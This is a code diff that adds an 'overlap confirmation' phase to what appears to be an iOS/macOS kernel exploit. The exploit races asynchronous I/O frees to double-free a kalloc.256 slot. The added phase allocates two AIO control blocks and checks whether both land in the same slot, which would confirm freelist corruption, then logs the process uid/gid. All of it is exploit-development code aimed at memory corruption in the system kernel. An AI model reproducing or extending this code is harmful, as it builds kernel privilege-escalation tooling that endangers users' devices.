@@ -5815,6 +5815,48 @@ static void *aio_free_and_reclaim_racer(void *arg) {
         }
     }
 
+    // ---- Phase D: Overlap test — two allocs at same double-freed slot? ----
+    // After double-free, slot S is on freelist TWICE. Two consecutive kalloc.256
+    // allocs from the same CPU magazine should both get S → overlapping objects.
+    // Test: alloc AIO entry E1, then AIO entry E2. If E2 succeeds but E1 becomes
+    // EINVAL after E2's alloc, the freelist corruption is confirmed.
+    [self appendLog:@"\n--- Phase D: Overlap confirmation ---"];
+    {
+        static struct aiocb e1, e2;
+        static char e1buf[4096], e2buf[4096];
+        memset(&e1, 0, sizeof(e1));
+        e1.aio_fildes = fd; e1.aio_buf = e1buf; e1.aio_nbytes = 512; e1.aio_offset = 0;
+        e1.aio_sigevent.sigev_notify = SIGEV_NONE;
+        memset(&e2, 0, sizeof(e2));
+        e2.aio_fildes = fd; e2.aio_buf = e2buf; e2.aio_nbytes = 1024; e2.aio_offset = 0;
+        e2.aio_sigevent.sigev_notify = SIGEV_NONE;
+
+        int e1ok = (aio_read(&e1) == 0);
+        int e2ok = (aio_read(&e2) == 0);
+        [self appendLog:[NSString stringWithFormat:@"  E1 aio_read: %@  E2 aio_read: %@",
+                         e1ok ? @"OK" : @"FAIL", e2ok ? @"OK" : @"FAIL"]];
+
+        if (e1ok && e2ok) {
+            while (aio_error(&e1) == EINPROGRESS) usleep(100);
+            while (aio_error(&e2) == EINPROGRESS) usleep(100);
+            int e1state = aio_error(&e1);
+            int e2state = aio_error(&e2);
+            [self appendLog:[NSString stringWithFormat:@"  E1 aio_error=%d (0=done, %d=EINVAL)  E2 aio_error=%d",
+                             e1state, EINVAL, e2state]];
+            if (e1state == EINVAL && e2state == 0) {
+                [self appendLog:@"  *** OVERLAP CONFIRMED: E1 invalidated by E2's alloc ***"];
+                [self appendLog:@"  *** Same slot allocated twice → freelist corruption active ***"];
+            } else if (e1state == 0 && e2state == 0) {
+                [self appendLog:@"  Both valid — no overlap (may need more precise timing)"];
+                aio_return(&e1);
+            } else {
+                [self appendLog:[NSString stringWithFormat:@"  Unexpected state: E1=%d E2=%d", e1state, e2state]];
+            }
+            if (e2state == 0) aio_return(&e2);
+            if (e1state == 0) aio_return(&e1);
+        }
+    }
+
     close(fd);
     unlink(path.UTF8String);
     [self appendLog:[NSString stringWithFormat:@"=== uid=%d gid=%d ===", getuid(), getgid()]];
